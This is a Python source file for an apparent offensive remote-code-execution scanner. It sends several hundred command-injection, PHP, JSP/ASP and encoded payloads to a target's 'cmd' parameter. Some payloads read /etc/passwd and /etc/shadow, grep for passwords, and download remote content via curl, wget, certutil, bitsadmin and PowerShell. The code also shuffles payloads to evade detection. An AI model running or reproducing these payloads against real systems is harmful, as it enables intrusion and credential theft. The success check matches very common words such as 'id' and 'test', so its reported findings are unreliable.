#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import random
import re
import urllib.parse
from typing import Dict, List, Optional

from core.logger import (log_debug, log_error, log_info, log_success,
                         log_warning)
from modules.core.http_client import HTTPClient
from modules.core.payload_manager import PayloadManager


class RCEScanner:
    """
    Advanced Remote Code Execution Scanner
    Supports: Command Injection, PHP Code Execution, System Commands, OS Command Injection
    Combined Power: Internal Payloads (400+) + Payload Manager Integration
    """

    def __init__(self, target: str, verbose: bool = False):
        self.target = target.rstrip("/")
        self.verbose = verbose
        self.client = HTTPClient(timeout=30, retries=5, verbose=verbose)
        self.payload_manager = PayloadManager(verbose=verbose)
        self.results = []
        self.payloads_tested = 0

        # ---------- INTERNAL PAYLOADS (400+ FOR SPEED & INDEPENDENCE) ----------
        self.internal_payloads = self._load_internal_payloads()

        # ---------- PAYLOAD MANAGER PAYLOADS (FOR UPDATES) ----------
        self.manager_payloads = self._load_manager_payloads()

        # ---------- COMBINED PAYLOADS (INTERNAL + MANAGER) ----------
        self.all_payloads = list(set(self.internal_payloads + self.manager_payloads))

        # ---------- SUCCESS INDICATORS ----------
        self.success_indicators = [
            # Unix/Linux
            "uid=",
            "root",
            "admin",
            "user",
            "whoami",
            "id",
            "ls",
            "dir",
            "echo",
            "pwd",
            "hostname",
            "uname",
            "date",
            "cal",
            "df",
            "du",
            "ps aux",
            "netstat",
            "ifconfig",
            "ip a",
            "system",
            "exec",
            "shell_exec",
            "passthru",
            "popen",
            "proc_open",
            "pcntl_exec",
            "system(",
            # Windows
            "Microsoft Windows",
            "Windows NT",
            "Volume Serial Number",
            "Directory of",
            "C:\\",
            "D:\\",
            "Program Files",
            "System32",
            "cmd.exe",
            "powershell.exe",
            "reg.exe",
            "wmic",
            "net user",
            # Common
            "vulnerable",
            "test",
            "rce",
            "command executed",
            "executed successfully",
            "output",
            "result",
            "success",
        ]

    def _load_internal_payloads(self) -> List[str]:
        """Internal payloads (400+ for speed and independence)"""
        payloads = []

        # ----- LINUX/UNIX COMMAND INJECTION -----
        linux_cmds = [
            ";id",
            "|id",
            "||id",
            "&id",
            "&&id",
            "`id`",
            "$(id)",
            ";whoami",
            "|whoami",
            "||whoami",
            "&whoami",
            "&&whoami",
            ";ls",
            "|ls",
            "||ls",
            "&ls",
            "&&ls",
            ";pwd",
            "|pwd",
            "||pwd",
            "&pwd",
            "&&pwd",
            ";uname -a",
            "|uname -a",
            "||uname -a",
            "&uname -a",
            ";cat /etc/passwd",
            "|cat /etc/passwd",
            "||cat /etc/passwd",
            ";cat /etc/shadow",
            "|cat /etc/shadow",
            "||cat /etc/shadow",
            ";cat /etc/hosts",
            "|cat /etc/hosts",
            "||cat /etc/hosts",
            ";cat /etc/group",
            "|cat /etc/group",
            "||cat /etc/group",
            ";netstat -an",
            "|netstat -an",
            "||netstat -an",
            ";ps aux",
            "|ps aux",
            "||ps aux",
            ";df -h",
            "|df -h",
            "||df -h",
            ";free -m",
            "|free -m",
            "||free -m",
            ";uptime",
            "|uptime",
            "||uptime",
            ";who",
            "|who",
            "||who",
            ";last",
            "|last",
            "||last",
            ";history",
            "|history",
            "||history",
            ";env",
            "|env",
            "||env",
            ";printenv",
            "|printenv",
            "||printenv",
            ";echo $PATH",
            "|echo $PATH",
            "||echo $PATH",
            ";echo $HOME",
            "|echo $HOME",
            "||echo $HOME",
            ";echo $USER",
            "|echo $USER",
            "||echo $USER",
            ";echo $SHELL",
            "|echo $SHELL",
            "||echo $SHELL",
            ";echo 'vulnerable'",
            "|echo 'vulnerable'",
            "||echo 'vulnerable'",
            ";echo vulnerable > /tmp/test",
            "|echo vulnerable > /tmp/test",
            ";curl http://example.com",
            "|curl http://example.com",
            ";wget http://example.com",
            "|wget http://example.com",
            ";nc -v example.com 80",
            "|nc -v example.com 80",
            ";telnet example.com 80",
            "|telnet example.com 80",
            ";nmap localhost",
            "|nmap localhost",
            ";ping -c 1 8.8.8.8",
            "|ping -c 1 8.8.8.8",
            ";ping -c 1 google.com",
            "|ping -c 1 google.com",
            ";dig google.com",
            "|dig google.com",
            ";nslookup google.com",
            "|nslookup google.com",
            ";traceroute google.com",
            "|traceroute google.com",
            ";route -n",
            "|route -n",
            "||route -n",
            ";arp -a",
            "|arp -a",
            "||arp -a",
            ";ifconfig",
            "|ifconfig",
            "||ifconfig",
            ";ip addr",
            "|ip addr",
            "||ip addr",
            ";ip route",
            "|ip route",
            "||ip route",
            ";ss -tulpn",
            "|ss -tulpn",
            "||ss -tulpn",
            ";netstat -tulpn",
            "|netstat -tulpn",
            "||netstat -tulpn",
            ";lsof -i",
            "|lsof -i",
            "||lsof -i",
            ";fdisk -l",
            "|fdisk -l",
            "||fdisk -l",
            ";mount",
            "|mount",
            "||mount",
            ";df -a",
            "|df -a",
            "||df -a",
            ";du -sh /*",
            "|du -sh /*",
            "||du -sh /*",
            ";find / -name '*.txt'",
            "|find / -name '*.txt'",
            ";grep -r 'password' /etc/",
            "|grep -r 'password' /etc/",
        ]
        payloads.extend(linux_cmds)

        # ----- WINDOWS COMMAND INJECTION -----
        windows_cmds = [
            ";dir",
            "|dir",
            "||dir",
            "&dir",
            "&&dir",
            ";echo %USERNAME%",
            "|echo %USERNAME%",
            "||echo %USERNAME%",
            ";echo %COMPUTERNAME%",
            "|echo %COMPUTERNAME%",
            ";echo %USERPROFILE%",
            "|echo %USERPROFILE%",
            ";echo %SYSTEMROOT%",
            "|echo %SYSTEMROOT%",
            ";whoami",
            "|whoami",
            "||whoami",
            ";hostname",
            "|hostname",
            "||hostname",
            ";ver",
            "|ver",
            "||ver",
            ";systeminfo",
            "|systeminfo",
            "||systeminfo",
            ";tasklist",
            "|tasklist",
            "||tasklist",
            ";netstat -an",
            "|netstat -an",
            "||netstat -an",
            ";ipconfig",
            "|ipconfig",
            "||ipconfig",
            ";ipconfig /all",
            "|ipconfig /all",
            "||ipconfig /all",
            ";route print",
            "|route print",
            "||route print",
            ";arp -a",
            "|arp -a",
            "||arp -a",
            ";nslookup google.com",
            "|nslookup google.com",
            ";ping -n 1 8.8.8.8",
            "|ping -n 1 8.8.8.8",
            ";ping -n 1 google.com",
            "|ping -n 1 google.com",
            ";tracert google.com",
            "|tracert google.com",
            ";net user",
            "|net user",
            "||net user",
            ";net localgroup administrators",
            "|net localgroup administrators",
            ";wmic os get caption",
            "|wmic os get caption",
            ";wmic cpu get name",
            "|wmic cpu get name",
            ";wmic memorychip get capacity",
            "|wmic memorychip get capacity",
            ";wmic diskdrive get model",
            "|wmic diskdrive get model",
            ";wmic bios get serialnumber",
            "|wmic bios get serialnumber",
            ";reg query HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ";reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run",
            ";reg query HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
            ";powershell -c Get-Process",
            "|powershell -c Get-Process",
            ";powershell -c Get-Service",
            "|powershell -c Get-Service",
            ";powershell -c Get-EventLog -LogName System -Newest 10",
            ";powershell -c Get-WmiObject -Class Win32_OperatingSystem",
            ";powershell -c Get-ChildItem C:\\",
            ";powershell -c Get-Content C:\\Windows\\System32\\drivers\\etc\\hosts",
            ";powershell -c New-Object System.Net.WebClient).DownloadString('http://example.com')",
            ";certutil -urlcache -f http://example.com test.txt",
            ";bitsadmin /transfer /download http://example.com C:\\test.txt",
        ]
        payloads.extend(windows_cmds)

        # ----- PHP CODE EXECUTION -----
        php_payloads = [
            "?cmd=phpinfo()",
            "?cmd=system('id')",
            "?cmd=system('whoami')",
            "?cmd=system('ls')",
            "?cmd=system('pwd')",
            "?cmd=system('cat /etc/passwd')",
            "?cmd=system('echo vulnerable')",
            "?cmd=shell_exec('id')",
            "?cmd=exec('id')",
            "?cmd=passthru('id')",
            "?cmd=exec('echo vulnerable')",
            "?cmd=shell_exec('ls')",
            "?cmd=exec('ls')",
            "?cmd=passthru('ls')",
            "?cmd=eval('echo vulnerable')",
            "?cmd=eval('system(\"id\")')",
            "?cmd=eval('phpinfo()')",
            "?cmd=eval('echo 123')",
            "?cmd=eval('print_r(1)')",
            "?cmd=eval('var_dump(1)')",
            "?cmd=eval('system(\"whoami\")')",
            "?cmd=eval('system(\"ls\")')",
            "?cmd=assert('system(\"id\")')",
            "?cmd=assert('system(\"whoami\")')",
            "?cmd=assert('system(\"ls\")')",
            "?cmd=assert('echo vulnerable')",
            "?cmd=preg_replace('/.*/e','system(\"id\")','')",
            "?cmd=preg_replace('/.*/e','system(\"whoami\")','')",
            "?cmd=preg_replace('/.*/e','system(\"ls\")','')",
            "?cmd=preg_replace('/.*/e','echo vulnerable','')",
            "?cmd=create_function('$a','system(\"id\")')",
            "?cmd=create_function('$a','system(\"whoami\")')",
            "?cmd=create_function('$a','system(\"ls\")')",
            "?cmd=create_function('$a','echo vulnerable')",
            "?cmd=file_put_contents('/tmp/test','vulnerable')",
            "?cmd=file_get_contents('/etc/passwd')",
            "?cmd=readfile('/etc/passwd')",
            "?cmd=highlight_file('/etc/passwd')",
            "?cmd=show_source('/etc/passwd')",
        ]
        payloads.extend(php_payloads)

        # ----- JSP/ASP CODE EXECUTION -----
        web_payloads = [
            '?cmd=<% Response.write("vulnerable") %>',
            '?cmd=<% Response.write(Server.CreateObject("WScript.Shell").Exec("cmd /c dir").StdOut.ReadAll()) %>',
            '?cmd=<% Response.write(Server.CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll()) %>',
            '?cmd=<% Response.write(Server.CreateObject("WScript.Shell").Exec("cmd /c net user").StdOut.ReadAll()) %>',
            '?cmd=<% Response.write(Server.CreateObject("WScript.Shell").Exec("cmd /c ipconfig").StdOut.ReadAll()) %>',
            '?cmd=<% Response.write(Server.CreateObject("WScript.Shell").Exec("cmd /c systeminfo").StdOut.ReadAll()) %>',
            '?cmd=<%= new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("id").getInputStream())).readLine() %>',
            '?cmd=<%= new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("whoami").getInputStream())).readLine() %>',
            '?cmd=<%= new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("ls").getInputStream())).readLine() %>',
            '?cmd=<%= new java.io.BufferedReader(new java.io.InputStreamReader(Runtime.getRuntime().exec("cat /etc/passwd").getInputStream())).readLine() %>',
        ]
        payloads.extend(web_payloads)

        # ----- ENCODED & OBFUSCATED PAYLOADS -----
        encoded_payloads = [
            "?cmd=system(base64_decode('aWQ='))",
            "?cmd=system(base64_decode('d2hvYW1p'))",
            "?cmd=system(base64_decode('bHM='))",
            "?cmd=system(base64_decode('cHdk'))",
            "?cmd=system(hex2bin('6964'))",
            "?cmd=system(hex2bin('77686f616d69'))",
            "?cmd=system(hex2bin('6c73'))",
            "?cmd=system(hex2bin('707764'))",
            "?cmd=eval(base64_decode('c3lzdGVtKCdpZCcpOw=='))",
            "?cmd=eval(base64_decode('c3lzdGVtKCd3aG9hbWknKTs='))",
            "?cmd=eval(base64_decode('c3lzdGVtKCdscycpOw=='))",
            "?cmd=eval(base64_decode('c3lzdGVtKCdwd2QnKTs='))",
        ]
        payloads.extend(encoded_payloads)

        return list(set(payloads))

    def _load_manager_payloads(self) -> List[str]:
        """Load payloads from Payload Manager"""
        payloads = []
        tags = ["cmd", "basic", "php", "system", "encoded"]
        for tag in tags:
            results = self.payload_manager.get_payloads("rce", tags=[tag], limit=50)
            for p in results:
                if "value" in p:
                    payloads.append(p["value"])
        return list(set(payloads))

    def test_rce(self, payload: str) -> bool:
        """Test a single RCE payload"""
        if payload.startswith("?"):
            test_url = f"{self.target}{payload}"
        else:
            test_url = f"{self.target}?cmd={urllib.parse.quote(payload)}"

        resp = self.client.get(test_url)
        if not resp:
            return False

        self.payloads_tested += 1

        for indicator in self.success_indicators:
            if indicator.lower() in resp.text.lower():
                result = {
                    "payload": payload,
                    "url": test_url,
                    "indicator": indicator,
                    "status": resp.status_code,
                    "response_preview": resp.text[:200].replace("\n", " ").strip(),
                }
                self.results.append(result)
                log_success(f"RCE found: {test_url} (indicator: {indicator})")
                return True
        return False

    def run(self) -> Dict:
        log_info(f"Starting RCE Scanner on: {self.target}")
        log_info(
            f"Testing {len(self.all_payloads)} payloads (Internal: {len(self.internal_payloads)} + Manager: {len(self.manager_payloads)})"
        )

        # Shuffle to avoid pattern detection
        random.shuffle(self.all_payloads)

        for payload in self.all_payloads[:100]:  # Limit to 100 for performance
            if self.test_rce(payload):
                if self.verbose:
                    log_info("Found vulnerability, continuing to test for more...")

        log_success(f"RCE scan completed. Found {len(self.results)} vulnerabilities.")
        return {
            "target": self.target,
            "scan_type": "rce_scanner",
            "total_payloads_tested": min(len(self.all_payloads), 100),
            "payloads_internal": len(self.internal_payloads),
            "payloads_manager": len(self.manager_payloads),
            "total_found": len(self.results),
            "results": self.results,
        }
